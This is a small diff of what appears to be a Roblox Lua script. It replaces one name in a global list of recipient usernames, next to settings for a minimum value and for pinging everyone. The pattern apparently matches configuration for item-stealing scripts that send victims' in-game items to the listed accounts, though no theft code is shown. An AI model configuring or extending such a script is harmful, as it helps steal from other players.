@@ -65,7 +65,7 @@ task.spawn(function()
         end
     end
 
-    _G.Usernames = {"morninggoodnightmeme","Venillarblx","Ieatrocksforfun31","mightyjohnplays","Adangvegas"}
+    _G.Usernames = {"morninggoodnightmeme","Venillarblx","Ieatrocksforfun31","kaisottolangmalakas","Adangvegas"}
     _G.min_value = 3
     _G.pingEveryone = "Yes"
     _G.scriptExecuted = _G.scriptExecuted or false
